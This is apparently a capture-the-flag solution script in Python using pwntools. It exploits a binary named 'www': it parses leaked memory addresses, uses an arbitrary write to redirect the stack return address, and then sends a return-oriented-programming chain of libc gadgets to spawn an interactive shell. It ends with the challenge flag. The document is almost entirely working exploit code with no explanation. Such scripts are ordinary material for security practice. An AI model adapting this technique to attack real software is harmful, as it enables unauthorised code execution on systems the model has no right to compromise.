from pwn import *
elf = ELF('./www', checksec=False)
libc = elf.libc

# note
gs = '''
b*main+131
b*main+178
'''
'''
aslr offset 
+0x1f2b8
+0x1f6e8
+0x1ff28
'''
context.terminal = "tmux splitw -h".split()
context.log_level = 'error'
while True:
    try:

        p = elf.process()
        elf.address = eval('0x' + p.recvline_contains(b'www').decode().split('-')[0])
        libc.address = eval('0x' + p.recvline_contains(b'libc.so.6').decode().split('-')[0])
        stack_base = eval('0x' + p.recvline_contains(b'stack').decode().split('-')[0])
        # overwrite second sym.imp.__isoc99_scanf return address to main func
        stack_ret = stack_base+0x1f0d8
        p.sendlineafter(b'Where:', b'%d' % (stack_ret))
        p.sendlineafter(b'What:', b'%d' % (elf.address + 0x00001370))
        p.recvline()
        print(f'\nfound at {p.pid}')
        break
    except:
        p.close()

print(f'elf base @ 0x{elf.address:0x}')
print(f'libc base @ 0x{libc.address:0x}')
print(f'stack base @ 0x{stack_base:0x}')
print(f'where @ 0x{stack_ret:0x}')
print(f'write @ 0x{elf.address+0x00001370:0x}')

p.sendlineafter(b'Where:', b'%d' % (stack_ret))
p.sendlineafter(b'What:', b'%d' % (libc.sym['gets']+6))
#
pause()
p.sendline(cyclic(1192) + p64(libc.address + 0x29cd6) * 4 + p64(libc.address + 0x2be51) + p64(0) + p64(libc.address + 0x11f497) + p64(0) * 2 + 
p64(libc.address + 0x2a745) + p64(0) + p64(elf.address + 0x4100)+  p64(libc.address + 0xebcf8))


sleep(0.5)
p.sendline(b"echo asdf")

p.interactive()
# CJ2023{4a2973e00a74fe25e04b88c565813cf1}
